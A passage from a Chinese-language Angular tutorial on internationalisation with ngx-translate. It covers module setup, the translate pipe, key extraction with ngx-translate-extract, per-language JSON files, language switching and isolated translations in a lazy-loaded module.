</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="ngx-translate"><a href="#ngx-translate" class="header-anchor">#</a> ngx-translate</h3> <p>接下来我们在根模块 AppModule 中导入 TranslateModule 模块</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> BrowserModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/platform-browser&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NgModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpClient<span class="token punctuation">,</span> HttpClientModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateModule<span class="token punctuation">,</span> TranslateLoader <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/core&quot;</span><span class="token punctuation">;</span> <span class="token comment">// 👈  </span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateHttpLoader <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/http-loader&quot;</span><span class="token punctuation">;</span> <span class="token comment">//  👈  </span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> AppComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./app.component&quot;</span><span class="token punctuation">;</span>
<span class="token comment">// 支持AOT</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">createTranslateLoader</span><span class="token punctuation">(</span><span class="token parameter">http<span class="token operator">:</span> HttpClient</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 👈  </span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TranslateHttpLoader</span><span class="token punctuation">(</span>http<span class="token punctuation">,</span> <span class="token string">&quot;./assets/i18n/&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;.json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

@<span class="token function">NgModule</span><span class="token punctuation">(</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    BrowserModule<span class="token punctuation">,</span>
    HttpClientModule<span class="token punctuation">,</span>
    TranslateModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token comment">// 👈  </span>
      loader<span class="token operator">:</span> <span class="token punctuation">{</span>
        provide<span class="token operator">:</span> TranslateLoader<span class="token punctuation">,</span> <span class="token comment">// 👈  </span>
        useFactory<span class="token operator">:</span> createTranslateLoader<span class="token punctuation">,</span> <span class="token comment">// 👈  </span>
        deps<span class="token operator">:</span> <span class="token punctuation">[</span>HttpClient<span class="token punctuation">]</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>在导入 TranslateModule 模块之后，我们需要在根组件 AppComponent 中初始化 TranslateService 服务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/core&quot;</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-root&quot;</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token string">&quot;./app.component.html&quot;</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;./app.component.css&quot;</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  title <span class="token operator">=</span> <span class="token string">&quot;ngx-translate-demo&quot;</span><span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">translate<span class="token operator">:</span> TranslateService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 设置默认的语言</span>
    translate<span class="token punctuation">.</span><span class="token function">setDefaultLang</span><span class="token punctuation">(</span><span class="token string">&quot;zh-cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;zh-cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>之后我们就可以在 app.component.html 模板中使用 TranslateModule 模块内提供的管道：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">=&quot;</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>center</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>
    Welcome to {{ title }}!
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>{{&quot;home&quot; | translate}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="ngx-translate-extract"><a href="#ngx-translate-extract" class="header-anchor">#</a> ngx-translate-extract</h3> <p>接下来我们来使用 ngx-translate-extract 这个库实现自动抽取模板中使用 TranslatePipe 转换的键。为了方便后续操作，我们可以定义一个 npm script：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;extract&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ngx-translate-extract --input ./src/app --output ./src/assets/i18n/{zh-cn,zh-hk,en}.json --sort --format namespaced-json --format-indentation ' '&quot;</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>上述 ngx-translate-extract 命令中所使用的参数：
– input：抽取字符串的目录；
– output：抽取结果的输出目录；
– sort：保存输出文件时， 按照字母顺序对键进行排序；
– format：指定输出的文件格式，支持 json、namespaced-json 及 pot，默认为 json；
– format-indentation：设置输出的缩进格式，默认为 \t。</p> <p>在定义完 extract 脚本之后，我们可以运行下面的命令执行自动抽取任务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>$ npm run extract
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>命令成功执行后，在 src/assets 目录下会生成 3 个 JSON 文件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>└── i18n
    ├── en<span class="token punctuation">.</span>json
    ├── zh<span class="token operator">-</span>cn<span class="token punctuation">.</span>json
    └── zh<span class="token operator">-</span>hk<span class="token punctuation">.</span>json
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>接下来我们来分别更新一下 3 个文件：</p> <ol><li>zh-cn.json</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span><span class="token string">&quot;home&quot;</span><span class="token operator">:</span> <span class="token string">&quot;首页&quot;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>zh-hk.json</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span><span class="token string">&quot;home&quot;</span><span class="token operator">:</span> <span class="token string">&quot;首頁&quot;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="3"><li>en.json</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span><span class="token string">&quot;home&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Home&quot;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>更新完上述的文件，我们就可以运行 npm start 启动应用了。这时候因为我们默认使用的简体中文，所以以下的模板的显示结果为 “首页”：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">&quot;home&quot;</span> <span class="token operator">|</span> translate<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>前面我们已经生成了 zh-cn.json、zh-hk.json 和 en.json 三个语言文件，下面我们来看一下如何切换语言，首先更新一下模板，新增三个按钮：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span><span class="token function">button</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;useZhCn()&quot;</span><span class="token operator">&gt;</span>中文简体<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span><span class="token function">button</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;useZhHk()&quot;</span><span class="token operator">&gt;</span>中文繁体<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span><span class="token function">button</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;useEn()&quot;</span><span class="token operator">&gt;</span>英语<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>然后更新一下 app.component.ts 文件，添加对应的方法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">useZhCn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;zh-cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">useZhHk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;zh-hk&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">useEn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;en&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="translateservice-translatedirective"><a href="#translateservice-translatedirective" class="header-anchor">#</a> TranslateService/TranslateDirective</h3> <p>ngx-translate-extract 这个库，除了能自动抽取模板中的使用 TranslatePipe 的字段之外，也可以抽取项目中应用TranslateDirective 和 TranslateService 进行国际化处理的字段。</p> <ol><li>TranslateService 使用示例</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>translate<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'HELLO'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>value<span class="token operator">:</span> <span class="token string">'world'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//=&gt; 'hello world'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol start="2"><li>TranslateDirective 使用示例</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token punctuation">[</span>translate<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;'HELLO'&quot;</span> <span class="token punctuation">[</span>translateParams<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;{value: 'world'}&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>下面我们来验证项目中使用 TranslateService 服务，能否正常抽取对应的字段。先更新一下 app.component.ts 文件，新增一个 init() 方法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>translate
    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;hello&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> value<span class="token operator">:</span> <span class="token string">&quot;world&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//=&gt; 'hello world'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>上面示例中，我们演示了 TranslateService 服务支持模板参数的特性。接下来，我们再次执行抽取操作：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>$ npm run extract
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>命令运行成功后，原先生成的 3 个 JSON 文件都会新增一个新的属性，这里以 zh-cn.json 文件为例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
 <span class="token string">&quot;hello&quot;</span><span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>
 <span class="token string">&quot;home&quot;</span><span class="token operator">:</span> <span class="token string">&quot;首页&quot;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>接着我们需要分别更新 zh-cn.json、zh-hk.json 和 en.json 文件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
 <span class="token string">&quot;hello&quot;</span><span class="token operator">:</span> <span class="token string">&quot;hello {{value}}&quot;</span><span class="token punctuation">,</span>
 <span class="token string">&quot;home&quot;</span><span class="token operator">:</span> <span class="token string">&quot;首页&quot;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>最后我们在介绍如何在懒加载的模块中启用国际化。</p> <h3 id="懒加载模块国际化"><a href="#懒加载模块国际化" class="header-anchor">#</a> 懒加载模块国际化</h3> <p>假设我们已经定义了一个 UserModule 懒加载模块，该模块内包含一个 UserComponent 组件，具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// user.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NgModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> CommonModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> RouterModule<span class="token punctuation">,</span> Route <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/router&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateModule<span class="token punctuation">,</span> TranslateLoader <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpClient <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateHttpLoader <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/http-loader&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> UserComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./user.component&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">createTranslateLoader</span><span class="token punctuation">(</span><span class="token parameter">http<span class="token operator">:</span> HttpClient</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TranslateHttpLoader</span><span class="token punctuation">(</span>http<span class="token punctuation">,</span> <span class="token string">&quot;./assets/i18n/user/&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;.json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> routes<span class="token operator">:</span> Route<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    path<span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span>
    component<span class="token operator">:</span> UserComponent
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    CommonModule<span class="token punctuation">,</span>
    RouterModule<span class="token punctuation">.</span><span class="token function">forChild</span><span class="token punctuation">(</span>routes<span class="token punctuation">)</span><span class="token punctuation">,</span>
    TranslateModule<span class="token punctuation">.</span><span class="token function">forChild</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      loader<span class="token operator">:</span> <span class="token punctuation">{</span>
        provide<span class="token operator">:</span> TranslateLoader<span class="token punctuation">,</span>
        useFactory<span class="token operator">:</span> createTranslateLoader<span class="token punctuation">,</span>
        deps<span class="token operator">:</span> <span class="token punctuation">[</span>HttpClient<span class="token punctuation">]</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      isolate<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>UserComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">UserModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><p>与 RouterModule 模块类似，TranslateModule 模块也为我们提供了 forChild() 方法，用于懒加载模块的使用。设置 isolate: true 参数，表示我们希望使用完全独立的服务实例。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// user.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TranslateService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@ngx-translate/core&quot;</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-user&quot;</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;div&gt;
      &lt;h3&gt;User Module&lt;/h3&gt;
      &lt;p&gt;{{&quot;myNameIs&quot; | translate}} semlinker&lt;/p&gt;
      &lt;button (click)=&quot;useZhCn()&quot;&gt;中文简体&lt;/button&gt;
      &lt;button (click)=&quot;useEn()&quot;&gt;英语&lt;/button&gt;
   &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">UserComponent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> translate<span class="token operator">:</span> TranslateService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token function">useZhCn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;zh-cn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">useEn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>translate<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&quot;en&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>定义完 UserModule 懒加载模块，我们可以使用 ngx-translate-extract 这个库，单独抽取该模块内的国际化配置信息。这里我们也同样在 npm scripts 中定义一个新的任务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">&quot;extract-user&quot;</span><span class="token operator">:</span> <span class="token string">&quot;ngx-translate-extract --input ./src/app/user --output ./src/assets/i18n/user/{zh-cn,zh-hk,en}.json --sort --format namespaced-json --format-indentation ' '&quot;</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这里需要注意的是 ngx-translate-extract 除了支持上述的参数外，还支持 --replace、--clean 和 --verbose 等参数，可以阅读 <a href="https://github.com/biesbjerg/ngx-translate-extract" target="_blank" rel="noopener noreferrer">ngx-translate-extract<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 说明文档。最后我们再来浏览一下根模块的相关文件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> BrowserModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/platform-browser&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NgModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> RouterModule<span class="token punctuation">,</span> Route <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/router&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpClient<span class="token punctuation">,</span> HttpClientModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
